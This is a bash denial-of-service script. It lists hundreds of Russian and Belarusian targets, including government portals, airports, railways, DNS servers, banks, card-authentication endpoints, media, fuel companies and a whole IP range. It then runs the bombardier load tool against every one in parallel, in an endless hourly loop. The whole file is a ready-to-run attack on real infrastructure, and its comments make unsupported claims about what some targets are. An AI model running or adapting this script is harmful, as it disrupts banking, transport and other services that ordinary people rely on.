#!/bin/bash -x

TIME="60m"
CONNECTIONSPERTARGET=14

DESTS=(
#BEGIN    FAKE ADDRESSES OF UKRAINIAN HUMANITARIAN ASSISTANCE!!!
"http://savelife.net.ua/"
"http://savelife.pw/"
"http://ukraine-war.pw/"
#END

#Russian addresses
#BEGIN www.dme.ru Domodedovo Airport
"https://195.218.193.151/"
"http://195.218.193.151/"
"http://87.245.150.33/"
"http://188.126.62.6:123/"
"http://195.218.193.141:25/"
#END www.dme.ru Domodedovo Airport 

#Russian communication systems
"http://www.megafon.ru:80/"
"http://moskva.beeline.ru:80/"
"https://moskva.mts.ru:443/"

#Russian social media
#BEGIN ok.ru
"https://ok.ru/"
"https://5.61.23.11/"
"https://217.20.155.13/"
"https://217.20.147.1/"
#END ok.ru

#FSB RTMP - internal communication system
"https://213.24.76.25:8080/"

#SIP Airships communication system
"https://195.218.193.189:5060/"

#Russian army communication system
"https://ca.vks.rosguard.gov.ru/"

#Smth inside russian army 
"https://95.173.148.51:53/"

#Moscow light control system
"https://109.252.233.150:51/"

#Russian media
"https://www.veseloeradio.ru/"
"https://tvzvezda.ru/"
"https://sputnik.com/"
"https://sputniknews.com/"
"https://www.kommersant.ru/"
"https://pobeda.aero/"
"https://tass.ru/"
"https://vz.ru/"
"https://www.vedomosti.ru/"
"https://www.vesti.ru"
"https://www.sobyanin.ru/"
"https://www.gov.spb.ru/"
"https://www.1tv.ru/live/"
"https://lenteplogaz.ru/"

#Russian Airlines
"https://www.VNUKOVO.ru/"
"https://svo.aero/"
"https://www.dme.ru/"
"https://www.aeroportdomodedovo.ru/"
"https://www.zia.aero/"
"https://pulkovoairport.ru/"
"https://airport-rzhevka.ru/"
"https://rov.aero/"
"https://krr.aero/"
"https://www.gdz.aero/"
"https://simferopol-airport.ru/"
"https://svx.aero/"

#Russian Railroads
"https://rzd.ru/"
"https://193.104.87.251/"
"https://194.84.25.50/"
"https://193.104.87.248/"
"https://217.175.155.100:53/UDP"
"https://217.175.155.12:53/UDP"
"https://217.175.140.71:53/UDP"

#Russian DNS
"https://178.248.233.32:443/"
"http://178.248.236.20:53/UDP"
"http://91.217.21.1:53/UDP"
"http://193.232.146.1:53/UDP"
"http://91.217.20.1/UDP"

#Russian digital forces
"https://norussians.xyz"
"https://stopnazi.xyz"

#Russian generic
"https://kwork.ru/"
"https://mironline.ru/"
"https://dnronline.su/"
"https://smart.swnn.ru/"
"https://www.vtbcapital-pr.ru/"
"https://region-am.ru/"
"https://www.ingosinvest.ru/"
"https://goszakaz.ru/"
"https://star-pro.ru/"
"http://ati.su/"
"https://region.ru/"
"https://monopoly.ru/"
"https://ul.su/"
"http://gruzovozkin.pro"
"https://www.volgograd.ru/"
"https://www.amurobl.ru/"
"https://dvinaland.ru/"
"https://astrobl.ru/"
"https://belregion.ru/"
"https://www.bryanskobl.ru/"
"https://avo.ru/"
"https://volgoduma.ru/"
"https://www.govvrn.ru/"
"https://www.ivanovoobl.ru/"
"https://irkobl.ru/"
"https://gov39.ru/"
"https://pre.admoblkaluga.ru/"
"https://ako.ru/"
"https://kirovreg.ru/"
"https://kurganobl.ru/"
"https://kursk.ru/"
"https://lenobl.ru/"
"https://www.49gov.ru/"
"https://mosreg.ru/"
"https://orel-region.ru/"
"https://midural.ru/"
"https://tula.ru/"
"https://ulgov.ru/"
"https://cheladmin.ru/"
"https://krd.ru/"
"https://stavregion.ru/"
"https://gov-murman.ru/"
"https://www.government-nnov.ru/"
"https://www.novreg.ru/"
"https://www.nso.ru/"
"https://omskportal.ru/"
"https://www.donland.ru/"
"https://pskov.ru/"
"https://saratov.gov.ru/"
"https://YOOMONEY.ru/"
"https://constructor.gazprom.ru/"
"https://ddos-guard.net/ru"
"https://stormwall.pro/"
"https://qrator.net/ru/"
"https://solidwall.ru/"
"https://www.nspk.ru/"
"https://server.nspk.ru/"
"https://dev.nspk.ru"
"https://sip.nspk.ru"
"https://www.TINKOFF.ru"
"https://MIRONLINE.ru"
"http://favt.gov.ru/"
"https://udprf.ru/"
"https://government.ru/"
"https://cloud.rkn.gov.ru/"
"https://pwd.wto.economy.gov.ru/"
"https://bezformata.com/"
"https://ria.ru/"
"https://gazeta.ru/"
"https://kp.ru/"
"https://riafan.ru/"
"https://pikabu.ru/"
"https://kommersant.ru/"
"https://mk.ru/"
"https://yaplakal.com/"
"https://rbc.ru/"
"https://lenta.ru/"
"https://lenta.ru/"
"http://vesti.ru/"
"https://proverki.gov.ru/"
"https://stroi.gov.ru/"
"https://mvd.gov.ru/"
"https://mail.rkn.gov.ru/"
"https://109.207.1.97/"
"https://109.207.1.118/"
"https://rkn.gov.ru/"
"https://www.nalog.gov.ru/"
"https://mil.ru/"
"http://government.ru/"
"http://kremlin.ru/"
"https://www.mos.ru/uslugi/"
"https://www.uralkali.com/ru/"
"https://www.polymetalinternational.com/ru/"
"https://ya.ru/"
"https://www.tmk-group.ru/"
"https://rmk-group.ru/ru/"
"https://nangs.org/"
"https://www.metalloinvest.com/"
"https://www.severstal.com/"
"https://www.sibur.ru/"
"https://www.evraz.com/ru/"
"https://www.surgutneftegas.ru/"
"https://www.nornickel.com/"
"https://magnit.ru/"
"https://lukoil.ru"
"http://duma.gov.ru/"
"http://president-sovet.ru/"
"https://sovetnational.ru/"
"https://www.gosuslugi.ru/ru/"
"https://zakupki.gov.ru/epz/main/public/home.html"
"https://gossluzhba.gov.ru/"
"http://defence.council.gov.ru/"
"http://budget.council.gov.ru/"
"http://www.kremlin.ru/"
"http://www.scrf.gov.ru/"
"http://www.ksrf.ru/ru/Pages/default.aspx"
"http://www.vsrf.ru/"
"http://premier.gov.ru/events/"
"https://www.mchs.gov.ru/"
"https://minjust.gov.ru/ru/"
"http://www.fsb.ru/"
"https://rosguard.gov.ru/"
"https://customs.gov.ru/"
"http://194.67.2.109:53/UDP"
"http://194.67.7.1:53/UDP"
"http://194.54.14.187:53/UDP"
"http://194.54.14.186:53/UDP"
"194.67.2.109:53"
"194.67.7.1:53"
"194.54.14.187:53"
"194.54.14.186:53"





#Russian banking system
#Crossbanking payment system 
"https://178.248.237.238/"
#BEGIN "Mir" banking websites
"https://185.170.2.232/"
"https://185.170.2.231/"
#END "Mir" banking websites
"https://acs.vendorcert.mirconnect.ru/"
"https://ds1.mirconnect.ru/"
"https://ds2.mirconnect.ru/"
"https://uat-ds1.mirconnect.ru/"
"https://uat-ds2.mirconnect.ru/"
"https://sberfn.ru/"
"https://sber-am.ru/"
"https://enter.unicredit.ru/"
"https://unicreditgroup.ru/"
"https://chbrr.crimea.com/"
"https://miranda-media.ru/"
"https://my.bank-hlynov.ru/"
"https://mtu.ru/"
"https://bank-hlynov.ru/"
"https://link.centrinvest.ru/"
"https:///"
"https:///"
"https:///"
"https:///"
"https:///"
"https://qiwi.com/"
"https://www.rosbank.ru/"
"https://www.unicreditbank.ru/"
"https://abr.ru/"
"https://www.vbrr.ru/"
"https://spvb.ru/"
"https://www.moex.com/"
"https://www.gazprombank.ru/" 
"https://www.POCHTABANK.ru/"
"https://cbr.ru/"
"https://www.bspb.ru/"
"https://www.ubrr.ru/"
"https://absolutbank.by/"
"https://www.raiffeisen.ru"
"https://rsb.ru/"
"https://alfabank.ru/"
"https://www.vtb.ru/" 
"https://www.sberbank.ru"
"https://www.RNCB.ru/" 
"https://omk.ru/" 
"https://www.eurosib.ru/"
"https://sber.ru/"
"https://profile.sber.ru/"
"https://api.developer.sber.ru/product/SberbankID" 
"https://api.sberbank.ru/prod/tokens/v2/oauth" 
"https://api.sberbank.ru/prod/tokens/v2/oidc" 
"https://scr.online.sberbank.ru/api/fl/idgib-w-3ds"
"https://3dsec.sberbank.ru/mportal3/auth/login"
"https://acs1.sbrf.ru"
"https://acs2.sbrf.ru"
"https://acs3.sbrf.ru"
"https://acs4.sbrf.ru"
"https://acs5.sbrf.ru"
"https://acs6.sbrf.ru"
"https://acs7.sbrf.ru"
"https://acs8.sbrf.ru"





#Russian crypto exchanges
"http://178.208.94.231/" 
"http://www.fsb.ru/" 
"https://cleanbtc.ru/" 
"https://bonkypay.com/" 
"https://changer.club/" 
"https://superchange.net/" 
"https://mine.exchange/" 
"https://platov.co/" 
"https://ww-pay.net/" 
"https://delets.cash/" 
"https://betatransfer.org/" 
"https://ramon.money/" 
"https://coinpaymaster.com/" 
"https://bitokk.biz/" 
"https://www.netex24.net/" 
"https://cashbank.pro/" 
"https://flashobmen.com/" 
"https://abcobmen.com/" 
"https://ychanger.net/" 
"https://multichange.net/" 
"https://24paybank.ne/" 
"https://royal.cash/" 
"https://prostocash.com/" 
"https://baksman.org/" 
"https://kupibit.me/" 
"https://abcobmen.com/" 





#Russian Fuel Companies
"https://gazprom.ru/"
"https://transneft.ru/"
"https://tektorg.ru/"
"https://rosneft.com/"
"https://b2b.sibur.ru/"
"https://onlinecontract.ru/"
"https://eurochemgroup.com/"
"https://uralchem.com/"
"https://nlmk.com/"
"https://www.tatneft.ru/"
"https://acron.ru/"
"https://aaa-srt-apps.lukoil.com/"
"https://srt-ns1.srv.lukoil.com/" 
"https://srt-ns2.srv.lukoil.com/" 
"https://ns2.srv.lukoil.com/" 
"https://ns1.srv.lukoil.com/" 
"https://gltb-ns2.srv.lukoil.com/" 
"https://gltb-ns1.srv.lukoil.com/" 
"https://db24-ns2.srv.lukoil.com/" 
"https://db24-ns1.srv.lukoil.com/" 
"91.142.135.0"
"91.142.135.1"
"91.142.135.2"
"91.142.135.3"
"91.142.135.4"
"91.142.135.5"
"91.142.135.6"
"91.142.135.7"
"91.142.135.8"
"91.142.135.9"
"91.142.135.10"
"91.142.135.11"
"91.142.135.12"
"91.142.135.13"
"91.142.135.14"
"91.142.135.15"
"91.142.135.16"
"91.142.135.17"
"91.142.135.18"
"91.142.135.19"
"91.142.135.20"
"91.142.135.21"
"91.142.135.22"
"91.142.135.23"
"91.142.135.24"
"91.142.135.25"
"91.142.135.26"
"91.142.135.27"
"91.142.135.28"
"91.142.135.29"
"91.142.135.30"
"91.142.135.31"
"91.142.135.32"
"91.142.135.33"
"91.142.135.34"
"91.142.135.35"
"91.142.135.36"
"91.142.135.37"
"91.142.135.38"
"91.142.135.39"
"91.142.135.40"
"91.142.135.41"
"91.142.135.42"
"91.142.135.43"
"91.142.135.44"
"91.142.135.45"
"91.142.135.46"
"91.142.135.47"
"91.142.135.48"
"91.142.135.49"
"91.142.135.50"
"91.142.135.51"
"91.142.135.52"
"91.142.135.53"
"91.142.135.54"
"91.142.135.55"
"91.142.135.56"
"91.142.135.57"
"91.142.135.58"
"91.142.135.59"
"91.142.135.60"
"91.142.135.61"
"91.142.135.62"
"91.142.135.63"
"91.142.135.64"
"91.142.135.65"
"91.142.135.66"
"91.142.135.67"
"91.142.135.68"
"91.142.135.69"
"91.142.135.70"
"91.142.135.71"
"91.142.135.72"
"91.142.135.73"
"91.142.135.74"
"91.142.135.75"
"91.142.135.76"
"91.142.135.77"
"91.142.135.78"
"91.142.135.79"
"91.142.135.80"
"91.142.135.81"
"91.142.135.82"
"91.142.135.83"
"91.142.135.84"
"91.142.135.85"
"91.142.135.86"
"91.142.135.87"
"91.142.135.88"
"91.142.135.89"
"91.142.135.90"
"91.142.135.91"
"91.142.135.92"
"91.142.135.93"
"91.142.135.94"
"91.142.135.95"
"91.142.135.96"
"91.142.135.97"
"91.142.135.98"
"91.142.135.99"
"91.142.135.100"
"91.142.135.101"
"91.142.135.102"
"91.142.135.103"
"91.142.135.104"
"91.142.135.105"
"91.142.135.106"
"91.142.135.107"
"91.142.135.108"
"91.142.135.109"
"91.142.135.110"
"91.142.135.111"
"91.142.135.112"
"91.142.135.113"
"91.142.135.114"
"91.142.135.115"
"91.142.135.116"
"91.142.135.117"
"91.142.135.118"
"91.142.135.119"
"91.142.135.120"
"91.142.135.121"
"91.142.135.122"
"91.142.135.123"
"91.142.135.124"
"91.142.135.125"
"91.142.135.126"
"91.142.135.127"
"91.142.135.128"
"91.142.135.129"
"91.142.135.130"
"91.142.135.131"
"91.142.135.132"
"91.142.135.133"
"91.142.135.134"
"91.142.135.135"
"91.142.135.136"
"91.142.135.137"
"91.142.135.138"
"91.142.135.139"
"91.142.135.140"
"91.142.135.141"
"91.142.135.142"
"91.142.135.143"
"91.142.135.144"
"91.142.135.145"
"91.142.135.146"
"91.142.135.147"
"91.142.135.148"
"91.142.135.149"
"91.142.135.150"
"91.142.135.151"
"91.142.135.153"
"91.142.135.154"
"91.142.135.155"
"91.142.135.156"
"91.142.135.157"
"91.142.135.158"
"91.142.135.159"
"91.142.135.160"
"91.142.135.161"
"91.142.135.162"
"91.142.135.163"
"91.142.135.164"
"91.142.135.165"
"91.142.135.166"
"91.142.135.167"
"91.142.135.168"
"91.142.135.169"
"91.142.135.170"
"91.142.135.171"
"91.142.135.172"
"91.142.135.173"
"91.142.135.174"
"91.142.135.175"
"91.142.135.176"
"91.142.135.177"
"91.142.135.178"
"91.142.135.179"
"91.142.135.180"
"91.142.135.181"
"91.142.135.182"
"91.142.135.183"
"91.142.135.184"
"91.142.135.185"
"91.142.135.186"
"91.142.135.187"
"91.142.135.188"
"91.142.135.189"
"91.142.135.190"
"91.142.135.191"
"91.142.135.192"
"91.142.135.193"
"91.142.135.194"
"91.142.135.195"
"91.142.135.196"
"91.142.135.197"
"91.142.135.198"
"91.142.135.199"
"91.142.135.200"
"91.142.135.201"
"91.142.135.202"
"91.142.135.203"
"91.142.135.204"
"91.142.135.205"
"91.142.135.206"
"91.142.135.207"
"91.142.135.208"
"91.142.135.209"
"91.142.135.210"
"91.142.135.211"
"91.142.135.212"
"91.142.135.213"
"91.142.135.214"
"91.142.135.215"
"91.142.135.216"
"91.142.135.217"
"91.142.135.218"
"91.142.135.219"
"91.142.135.220"
"91.142.135.221"
"91.142.135.222"
"91.142.135.223"
"91.142.135.224"
"91.142.135.225"
"91.142.135.226"
"91.142.135.227"
"91.142.135.228"
"91.142.135.229"
"91.142.135.230"
"91.142.135.231"
"91.142.135.232"
"91.142.135.233"
"91.142.135.234"
"91.142.135.235"
"91.142.135.236"
"91.142.135.237"
"91.142.135.238"
"91.142.135.239"
"91.142.135.240"
"91.142.135.241"
"91.142.135.242"
"91.142.135.243"
"91.142.135.244"
"91.142.135.245"
"91.142.135.246"
"91.142.135.247"
"91.142.135.248"
"91.142.135.249"
"91.142.135.250"
"91.142.135.251"
"91.142.135.252"
"91.142.135.253"
"91.142.135.254"
"193.30.239.36"
"193.30.239.35"
"193.30.239.32"
"193.30.239.31"
"195.128.158.115"
"193.30.239.34"
"217.22.170.68"
"193.30.239.33"
"193.43.182.3"
"194.186.236.187"
"217.22.170.180"
"46.61.139.227"





#Belarus addresses
"https://belarus.by/"
"http://belta.by/",
"https://sputnik.by/",
"https://www.tvr.by/"
"https://www.sb.by/"
"https://belmarket.by/"
"https://www.belarus.by/"
"https://belarus24.by/"
"https://ont.by/"
"https://www.024.by/"
"https://www.belnovosti.by/"
"https://mogilevnews.by/"
"https://www.mil.by/"
"https://yandex.by/"
"https://www.slonves.by/"
"http://www.ctv.by/"
"https://radiobelarus.by/"
"https://radiusfm.by/"
"https://alfaradio.by/"
"https://radiomir.by/"
"https://radiostalica.by/"
"https://radiobrestfm.by/"
"https://www.tvrmogilev.by/"
"https://minsknews.by/"
"https://zarya.by/"
"https://grodnonews.by/"
"https://rec.gov.by/ru"
"https://president.gov.by/ru"
"https://www.mvd.gov.by/ru"
"http://www.kgb.by/ru/"
"www.prokuratura.gov.by"
"www.mil.by"
"www.government.by"
"www.prokuratura.gov.by"
"www.nbrb.by"
"https://belarusbank.by/"
"https://brrb.by/"
"https://www.belapb.by/"
"https://bankdabrabyt.by/"
"https://belinvestbank.by/individual"
"https://bgp.by/ru/"
"https://www.belneftekhim.by"
"http://www.bellegprom.by"
"https://www.energo.by"
"http://belres.by/ru/"





#Belarusian banking system
"https://bsb.by/"
"https://bnb.by/"
"https://btabank.by/"
"https://www.mtbank.by/"
"https://belgazprombank.by/"
"https://www.belinvestbank.by/"
"https://belapb.by/"
"https://www.vtb.by/"
"https://belveb.by/" 
"https://absolutbank.by/"


#LNR addresses
"https://gtrklnr.com/"

#DNR addresses
"https://mer.govdnr.ru/"

#generic
"https://v2.premise.com/"
"http://195.93.247.48:80/"
"https://195.93.247.144:443/"
"http://195.140.146.69:80/"
"http://195.93.247.53:80/"
"http://84.201.176.124:22/"
"http://178.154.224.115:22/"
"http://195.42.165.36:80/"
"http://195.42.165.36:443/"
"https://34.149.163.214/"
"https://premise.com/" 
"http://91.149.180.89:443/")


while true
do
    for DEST in ${DESTS[@]}
    do
        bombardier -c $CONNECTIONSPERTARGET -d $TIME -l $DEST &
    done
	sleep 3550s
done

